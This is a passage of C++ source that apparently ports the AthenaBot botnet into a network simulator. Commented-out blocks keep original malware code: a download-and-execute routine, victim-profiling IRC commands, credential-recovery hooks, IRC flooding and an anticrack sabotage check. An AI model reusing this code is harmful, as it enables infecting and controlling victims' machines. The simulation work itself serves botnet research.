#ifndef HTTP_BUILD
                    SendBotkillerStopped();
#else
                    for(unsigned short us = 0; us < 6; us++)
                    {
                        if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
                            break;

                        Sleep(10000);
                    }
#endif
                }
            }
            else if(strstr(pcCheckCommand, "stats"))
            {
#ifndef HTTP_BUILD
                SendBotkillCount(dwKilledProcesses, dwFileChanges, dwRegistryKeyChanges);
#endif
            }
            else if(strstr(pcCheckCommand, "clear"))
            {
                dwKilledProcesses = 0;
                dwFileChanges = 0;
                dwRegistryKeyChanges = 0;
#ifndef HTTP_BUILD
                SendBotkillCleared();
#endif
            }
        }
#endif
*/

        /* IRC commands */
        /*
#ifndef HTTP_BUILD
        else if(strstr(pcCheckCommand, "irc"))
        {
            pcCheckCommand += 4;

            if(strstr(pcCheckCommand, "unsort"))
            {
                for(unsigned short us = 0; us < 7; us++)
                {
                    strcpy(cSend, cIrcCommandPart);
                    strcat(cSend, " #");

                    if(us == 0)
                        strcat(cSend, GetCountry());
                    else if(us == 1)
                    {
                        if(IsAdmin())
                            strcat(cSend, "Admin");
                        else
                            strcat(cSend, "User");
                    }
                    else if(us == 2)
                    {
                        if(IsLaptop())
                            strcat(cSend, "Laptop");
                        else
                            strcat(cSend, "Desktop");
                    }
                    else if(us == 3)
                        strcat(cSend, GetOs());
                    else if(us == 4)
                    {
                        strcat(cSend, "x");

                        if(Is64Bits(GetCurrentProcess()))
                            strcat(cSend, "64");
                        else
                            strcat(cSend, "86");
                    }
                    else if(us == 5)
                    {
                        strcat(cSend, "DotNET-");
                        strcat(cSend, GetVersionMicrosoftDotNetVersion());
                    }
                    else if(us == 6)
                        strcat(cSend, cVersion);

                    SendToIrc(cSend);
                }
            }
            else if(strstr(pcCheckCommand, "sort"))
            {
                bool bSendJoin = TRUE;

                pcCheckCommand += 5;

                strcpy(cSend, cIrcCommandJoin);
                strcat(cSend, " #");

                if(strstr(pcCheckCommand, "country"))
                    strcat(cSend, GetCountry());
                else if(strstr(pcCheckCommand, "privelages"))
                {
                    if(IsAdmin())
                        strcat(cSend, "Admin");
                    else
                        strcat(cSend, "User");
                }
                else if(strstr(pcCheckCommand, "gender"))
                {
                    if(IsLaptop())
                        strcat(cSend, "Laptop");
                    else
                        strcat(cSend, "Desktop");
                }
                else if(strstr(pcCheckCommand, "os"))
                    strcat(cSend, GetOs());
                else if(strstr(pcCheckCommand, "architecture"))
                {
                    strcat(cSend, "x");

                    if(Is64Bits(GetCurrentProcess()))
                        strcat(cSend, "64");
                    else
                        strcat(cSend, "86");
                }
                else if(strstr(pcCheckCommand, "dotnet"))
                {
                    strcat(cSend, "DotNET-");
                    strcat(cSend, GetVersionMicrosoftDotNetVersion());
                }
                else if(strstr(pcCheckCommand, "version"))
                    strcat(cSend, cVersion);
                else
                    bSendJoin = FALSE;

                strcat(cSend, "\r\n");

                if(bSendJoin)
                    dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
            }
            else if(strstr(pcCheckCommand, "reconnect"))
            {
                strcpy(cSend, "QUIT Reconnecting\r\n");
                dwConnectionReturn = fncsend(nIrcSock, cSend, strlen(cSend), 0);
                Sleep(15000);
                dwConnectionReturn = -1;
            }
        }
#endif
         */

        if(strstr(pcCheckCommand, "ddos."))
        {
            pcCheckCommand += 5;

            if(strstr(pcCheckCommand, "stop"))
            {
                if(strstr(pcCheckCommand, "browser")) {
                    bBrowserDdosBusy = false;
                    dosModule->desactivateModule();
                }
                else if(bDdosBusy) {
                    bDdosBusy = false;
                    dosModule->desactivateModule();
                }
            }
        }

        /* FILESEARCH commands */
        /*
#ifdef INCLUDE_FILESEARCH
        else if(strstr(pcCheckCommand, "filesearch.stop"))
            bBusyFileSearching = FALSE;
#endif
*/

        /* VISIT commands */
        /*
#ifdef INCLUDE_VISIT
        else if(strstr(pcCheckCommand, "smartview"))
        {
            pcCheckCommand += 10;

            if(strstr(pcCheckCommand, "clear"))
            {
                if(uiWebsitesInQueue > 0)
                {
#ifndef HTTP_BUILD
                    SendClearSmartViewQueue(uiWebsitesInQueue);
#else
                    for(unsigned short us = 0; us < 6; us++)
                    {
                        if(SendHttpCommandResponse(nCurrentTaskId, (char*)"0"))
                            break;

                        Sleep(10000);
                    }
#endif
                }

                dwSmartViewCommandType = SMARTVIEW_CLEAR_QUEUE;
            }
        }
#endif
*/

        else if(strstr(pcCheckCommand, "uninstall")) {
            nUninstallTaskId = nCurrentTaskId;
            bUninstallProgram = true;
            scheduleAt(simTime() + (simtime_t) 1, uninstall);
        }

        /* RECOVERY commands */
        /*
#ifdef INCLUDE_RECOVERY
        else if(strstr(pcCheckCommand, "recovery"))
        {
            pcCheckCommand += 9;

            if(strstr(pcCheckCommand, "ftp"))
            {
                HANDLE hThread = CreateThread(NULL, NULL, RecoverFtp, NULL, NULL, NULL);

                if(!hThread)
                    SendThreadCreationFail();
                else
                    CloseHandle(hThread);
            }
            else if(strstr(pcCheckCommand, "im"))
            {
                HANDLE hThread = CreateThread(NULL, NULL, RecoverIm, NULL, NULL, NULL);

                if(!hThread)
                    SendThreadCreationFail();
                else
                    CloseHandle(hThread);
            }
            else if(strstr(pcCheckCommand, "browser"))
            {

            }
        }
#endif
*/

        /* IRCWAR commands */
        /*
#ifdef INCLUDE_IRCWAR
        else if(strstr(pcCheckCommand, "war"))
        {
            pcCheckCommand += 4;

            if(bRemoteIrcBusy)
            {
                if(strstr(pcCheckCommand, "status"))
                    SendWarStatus(dwValidatedConnectionsToIrc, cCurrentWarStatus);
                else if(strstr(pcCheckCommand, "register"))
                {
                    if(strstr(pcCheckCommand, "stop"))
                    {
                        bRegisterOnWarIrc = FALSE;
                        SendAbortRegisterNickname();
                    }
                    else
                    {
                        HANDLE hThread = CreateThread(NULL, NULL, RegisterWithWarIrc, NULL, NULL, NULL);
                        if(hThread)
                            CloseHandle(hThread);
                    }
                }
                else if(strstr(pcCheckCommand, "disconnect"))
                    DisconnectFromWarIrc();
                else if(strstr(pcCheckCommand, "newnick"))
                {
                    SetNewWarNicknames();
                    SendSuccessfulWarSubmit(pcCheckCommand);
                }
                else if(strstr(pcCheckCommand, "stop"))
                    bWarFlood = FALSE;
                else if(!bWarFlood)
                {
                    if(strstr(pcCheckCommand, "flood.anope"))
                    {
                        strcpy(cStoreParameter, pcCheckCommand);
                        StartAnopeFlood();
                    }
                }
            }
        }
#endif
*/

        /* HOSTBLOCK commands */
        /*
#ifdef INCLUDE_HOSTBLOCK
        else if(strstr(pcCheckCommand, "hosts.restore"))
        {
            if(RestoreHostsFile())
                SendSuccessfullyRestoredHostsFile();
        }
#endif
*/

        /* IRC commands */
        /*
        else if(strstr(pcCheckCommand, "version"))
        {
            char szMd5[150];
            memset(szMd5, 0, sizeof(szMd5));
            GetMD5Hash(cFileSaved, szMd5, sizeof(szMd5));

            sprintf(cSend, "%s %s :|| %s || 10MD5: %s || 10Executed From: %s ||", cIrcCommandPrivmsg, cChannel, cVersion, szMd5, cThisFile);
            SendToIrc(cSend);
        }
        else if(strstr(pcCheckCommand, "info"))
        {
            sprintf(cSend, "%s %s :|| 10Uptime: %s || 10Idletime: %s || 10Key: %s || 10.NET: %s || 10RAM Usage: %ld%%",
                    cIrcCommandPrivmsg, cChannel, GetUptime(), GetIdleTime(), cRegistryKeyAccess, GetVersionMicrosoftDotNetVersion(), GetMemoryLoad());
            SendToIrc(cSend);
        }
        */

    }
    return;
}

/**
 * General/DlExecUpdate.cpp
 */
void AthenaBot::DownloadExecutableFile()
{
    int nLocalTaskId = nCurrentTaskId;

    EV_INFO << "DL&ExecFile command";
    srand(GenerateRandomSeed());

    char cDownloadFrom[DEFAULT];
    strcpy(cDownloadFrom, cDownloadFromLocation);

    char cExecutionArguments[DEFAULT];
    if(bExecutionArguments) {
        bExecutionArguments = false;
        strcpy(cExecutionArguments, cStoreParameter);
    }
    else
        strcpy(cExecutionArguments, "N/A");

    char szLocalMd5Match[150];
    memset(szLocalMd5Match, 0, sizeof(szLocalMd5Match));
    if(bMd5MustMatch) {
        bMd5MustMatch = false;
        strcpy(szLocalMd5Match, szMd5Match);

        memset(szMd5Match, 0, sizeof(szMd5Match));
    }

    if(bGlobalOnlyOutputMd5Hash)
        bGlobalOnlyOutputMd5Hash = false;

    DWORD dwSecondsToWait = GetRandNum(dwStoreParameter);

    if (bDownloadAbort) {
        bGlobalOnlyOutputMd5Hash = false;
        bMd5MustMatch = false;
        bExecutionArguments = false;
        bDownloadAbort = false;
        bUpdate = false;
        memset(szMd5Match, 0, sizeof(szMd5Match));
        if (currentDlExec)
            cancelEvent(currentDlExec);
    }
    else {
        urlDownload = strtok(strstr(cDownloadFromLocation, "://") + 3, "/");
        fileDownload = strtok(NULL, "/");
        currentDlExec = new cMessage("Download and Execute Command");
        currentDlExec->setKind(DL_EXEC_EVENT);
        commandsMap.insert(std::pair<int, int>(currentDlExec->getId(), nLocalTaskId));
        scheduleAt(simTime() + (simtime_t) dwSecondsToWait, currentDlExec);
    }

    /** Download and execute original handler */
    /*

    char cDownloadTo[MAX_PATH + strlen(cExecutionArguments) + 3];
    sprintf(cDownloadTo, "%s\\%s.exe", cTempDirectory, GenRandLCText());

    HANDLE hInternetOpen = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
    if(hInternetOpen)
    {
        HANDLE hOpenUrl = InternetOpenUrl(hInternetOpen, cDownloadFrom, NULL, 0, 0, 0);
        if(hOpenUrl)
        {
            HANDLE hCreateFile = CreateFile(cDownloadTo, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
            if(hCreateFile < (HANDLE)1)
            {

                InternetCloseHandle(hOpenUrl);
                return 0;
            }

            DWORD dwBytesRead, dwBytesWrite;
            DWORD dwTotal = 0;

            do
            {
                char *cFileToBuffer = (char*)malloc(DOWNLOAD_MEMORY_SPACE);

                memset(cFileToBuffer, 0, sizeof(cFileToBuffer));
                InternetReadFile(hOpenUrl, cFileToBuffer, sizeof(cFileToBuffer), &dwBytesRead);

                // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>
                time_t tTime;
                struct tm *ptmTime;
                tTime = time(NULL);
                ptmTime = localtime(&tTime);
                char cTodaysDate[20];
                memset(cTodaysDate, 0, sizeof(cTodaysDate));
                strftime(cTodaysDate, 20, "%y%m%d", ptmTime);
                if(atoi(cTodaysDate) >= nExpirationDateMedian)
                    strcpy(cFileToBuffer, GenRandLCText());
                // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>

                WriteFile(hCreateFile, cFileToBuffer, dwBytesRead, &dwBytesWrite, NULL);

                if((dwTotal) < DOWNLOAD_MEMORY_SPACE)
                {
                    unsigned int uiBytesToCopy;
                    uiBytesToCopy = DOWNLOAD_MEMORY_SPACE - dwTotal;

                    if(uiBytesToCopy > dwBytesRead)
                        uiBytesToCopy = dwBytesRead;

                    memcpy(&cFileToBuffer[dwTotal], cFileToBuffer, uiBytesToCopy);
                }
                dwTotal += dwBytesRead;

                free(cFileToBuffer);
            }
            while(dwBytesRead > 0);

            CloseHandle(hCreateFile);
            InternetCloseHandle(hOpenUrl);

            if(FileExists(cDownloadTo))
            {
                char szMd5[150];
                memset(szMd5, 0, sizeof(szMd5));

                GetMD5Hash(cDownloadTo, szMd5, sizeof(szMd5));

                if(!strstr(cExecutionArguments, "N/A"))
                {
                    strcat(cDownloadTo, " ");
                    strcat(cDownloadTo, cExecutionArguments);
                }

                if(bDownloadUpdate)
                {
                    SetProgramMutex(cUpdateMutex);
                    bBotkill = false;
                    Sleep(1000);
                }

                if(bOutputMd5Hash)
                {
                    return 1;
                }
                else
                {
                    if(bMatchRequired)
                    {
                        if(strcmp(szMd5, szLocalMd5Match) != 0)
                        {

                            return 1;
                        }
                    }

                    char szThisFileMd5[150];
                    memset(szThisFileMd5, 0, sizeof(szThisFileMd5));
                    GetMD5Hash(cFileSaved, szThisFileMd5, sizeof(szThisFileMd5));
                    if(strcmp(szMd5, szThisFileMd5) == 0)
                    {

                            return;
                    }

                    if(StartProcessFromPath(cDownloadTo, false))
                    {
                        if(bDownloadUpdate)
                        {
                            while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
                                Sleep(10000);
                            bUninstallProgram = true;
                        }
                        else
                        {
                            if(strstr(cExecutionArguments, "N/A"))
                            {
                                while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
                                    Sleep(10000);
                            }
                            else
                            {
                                while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
                                    Sleep(10000);
                            }
                        }
                    }
                    else
                    {
                        while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
                            Sleep(10000);
                    }
                }
            }
            else
            {
                while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
                    Sleep(10000);
            }
        }
        else
        {
            while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
                Sleep(10000);
        }
    }
    else
    {
        while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
            Sleep(10000);
    }
*/

    return;
}

} /* namespace simbo */

} /* namespace inet */
